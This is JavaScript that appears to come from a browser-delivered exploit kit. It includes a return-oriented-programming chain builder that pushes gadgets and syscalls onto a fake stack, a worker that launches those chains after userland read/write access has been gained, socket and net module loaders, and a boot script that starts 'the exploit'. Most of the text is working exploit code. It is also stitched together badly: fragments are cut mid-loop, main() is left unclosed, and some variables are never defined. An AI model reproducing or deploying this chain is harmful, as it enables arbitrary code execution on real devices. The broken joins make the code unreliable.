  for (let offset = 0x7f000; offset < 0x80000; offset += 0x8) {

    if (v.low === expected.low && v.hi === expected.hi) count++;

// Verify module syscall numbers against global constants in syscalls.js
function verifySyscallNumbers(mod) {
  const expected = {
    SOCKET: SYS_SOCKET, SETSOCKOPT: SYS_SETSOCKOPT, BIND: SYS_BIND,
    LISTEN: SYS_LISTEN, GETSOCKNAME: SYS_GETSOCKNAME, ACCEPT: SYS_ACCEPT,
    READ: SYS_READ, WRITE: SYS_WRITE, CLOSE: SYS_CLOSE, GETPID: SYS_GETPID,
  };
  const names = Object.keys(mod.CALL);
  for (const name of names) {
    const fromGlobals = expected[name];
    if (typeof fromGlobals !== "number")
      throw new Error(`a module uses ${name}, which has no SYS_ global`);
    const fromModule = mod.CALL[name];
    if (fromGlobals !== fromModule)
      throw new Error(
        `syscall number drift for ${name}: syscalls.js says 0x${fromGlobals.toString(16)}, ` +
        `the module says 0x${fromModule.toString(16)}`);
  }
  return names.length;
}

// Standalone builds supply a Blob worker through ropWorkerFactory.
function makeRopWorker() {
  const factory = (typeof window !== "undefined" && window.ropWorkerFactory) || null;
  if (!factory) return new Worker("./src/utils/rop_slave.js");
  const worker = factory();
  if (!worker || typeof worker.postMessage !== "function") {
    throw new Error(
      "window.ropWorkerFactory did not return a Worker. It must return an object with " +
      "postMessage() -- a real Worker, typically built from a Blob URL.");
  }
  return worker;
}

// Use the inline module registry when present; otherwise import from the page.
async function loadModule(path) {
  const loader = (typeof window !== "undefined" && window.moduleLoader) || null;
  if (loader) return await loader(path);
  // Indirect eval resolves imports against the page URL.
  return await (0, eval)('import(' + JSON.stringify(path) + ')');
}

async function main(userlandRW, { serve = true } = {}) {

  let probeMode = false;
  try {
    probeMode = new URLSearchParams(location.search).get("probe") === "1";
  } catch (e) {}

  if (probeMode) {
    const probe = await loadModule("./socket_test.js");
    const checked = verifySyscallNumbers(probe);
    log(`syscall numbers cross-checked against syscalls.js (${checked})`, "info");
    const result = await probe.runSocketTest(p, chain, log);
    if (!result || !result.done)
      throw new Error(`socket test did not finish (stage: ${result && result.stage})`);
    log(`socket test complete on port ${result.port}`, "success");
    return { p, chain };
  }

  const { CALL: netCall } = await loadModule("./net.js");

  log(`syscall numbers cross-checked against syscalls.js (${checked})`, "info");

class rop {
    constructor(p, stack_size = 0x80000, reserved_stack = 0x10000) {
        this.stack_size = stack_size;
        this.reserved_stack = reserved_stack;
        this.stack_dwords = stack_size / 4;
        this.reserved_stack_index = reserved_stack / 4;

        this.stack_memory = p.malloc(this.stack_dwords + 0x2 + 0x200);
        this.stack_array = this.stack_memory.backing;
        this.zeroed_stack = new Uint32Array(this.stack_dwords);
        this.stack_entry_point = this.stack_memory.add32(reserved_stack);
        this.return_value = this.stack_memory.add32(stack_size);

        this.p = p;
        this.gadgets = p.gadgets;
        this.syscalls = p.syscalls;
        this.count = 0;
    }

    clear() {
        this.count = 0;
        this.stack_array.set(this.zeroed_stack);
    }

    push(value) {
        if (value instanceof int64 || (value && typeof value === "object" && typeof value.low === "number" && typeof value.hi === "number")) {
            const index = this.reserved_stack_index + this.count++ * 2;
            this.stack_array[index] = value.low;
            this.stack_array[index + 1] = value.hi;
        } else if (typeof value === "number") {
            if (value > 0xffffffff) {
                throw new Error("you're trying to write a value exceeding 32-bits without using an int64 instance (0x" + value.toString(16) + ")");
            }
            const index = this.reserved_stack_index + this.count++ * 2;
            this.stack_array[index] = value;
            this.stack_array[index + 1] = 0;
        } else {
            const desc = value === undefined ? "undefined"
                : value === null ? "null"
                : typeof value === "object" ? (value.constructor ? value.constructor.name : typeof value)
                : typeof value + " (" + String(value) + ")";
            throw new Error("You're trying to write a non number/non int64 value? (" + desc + ")");
        }
    }

    push_write8(dest, value) {
        this.push(this.gadgets["pop rdi"]);
        this.push(dest);
        this.push(this.gadgets["pop rsi"]);
        this.push(value);
        this.push(this.gadgets["mov [rdi], rsi"]);
    }

    write_result(dest) {
        this.push(this.gadgets["pop rdi"]);
        this.push(dest);
        this.push(this.gadgets["mov [rdi], rax"]);
    }

    push_sysv(rdi, rsi, rdx, rcx, r8, r9) {
        const args = [rdi, rsi, rdx, rcx, r8, r9];
        const regs = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"];
        for (let i = 0; i < args.length; i++) {
            if (args[i] == undefined) continue;
            this.push(this.gadgets["pop " + regs[i]]);
            this.push(args[i]);
        }
    }

    fcall(rip, rdi, rsi, rdx, rcx, r8, r9) {
        this.push_sysv(rdi, rsi, rdx, rcx, r8, r9);
        if (this.stack_entry_point.add32(this.count * 8).low & 8)
            this.push(this.gadgets["ret"]);
        this.push(rip);
    }

    add_syscall(sysc, rdi, rsi, rdx, rcx, r8, r9) {
        this.fcall(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
    }
}

class worker_rop extends rop {
    constructor(p, stack_size, reserved_stack) {
        super(p, stack_size, reserved_stack);
        this.p.pre_chain(this);
    }

    clear() {
        super.clear();
        this.p.pre_chain(this);
    }

    async call(rip, rdi, rsi, rdx, rcx, r8, r9) {
        this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
        this.write_result(this.return_value);
        await this.run();
        return this.p.read8(this.return_value);
    }

    async syscall(sysc, rdi, rsi, rdx, rcx, r8, r9) {
        return await this.call(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
    }

    add_syscall_ret(retstore, sysc, rdi, rsi, rdx, rcx, r8, r9) {
        this.fcall(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
        this.write_result(retstore);
    }

    async run() {
        await this.p.launch_chain(this);
        this.clear();
    }

  <script>
  /* === boot (must come last: it runs the module graph) === */
// === startup scripts, then boot ============================================
// Runs awaited startup scripts before starting the exploit via site.js.
(function () {
  "use strict";

  function report(message) {
    if (window.writeLog) {
      window.writeLog(message, "error");
      return;
    }
    console.error(message);
    var output = document.getElementById("console");
    if (output) {
      var line = document.createElement("div");
      line.className = "log-line log-error";
      line.textContent = message;
      output.appendChild(line);
    }
  }

  window.__startupReady = (async function () {
    var current = null;
    try {
      var AsyncFunction = Object.getPrototypeOf(async function () {}).constructor;
      for (var i = 0; i < window.__startupScripts.length; i++) {
        current = window.__startupScripts[i];
        await new AsyncFunction(current.source).call(window);
      }
      current = null;
      window.__boot();
      return true;
    } catch (error) {
      report((current ? "startup script " + current.path + " failed: "
                      : "module graph failed to load: ") +
        (error && error.message ? error.message : error));
      return false;
    }
  })();
})();
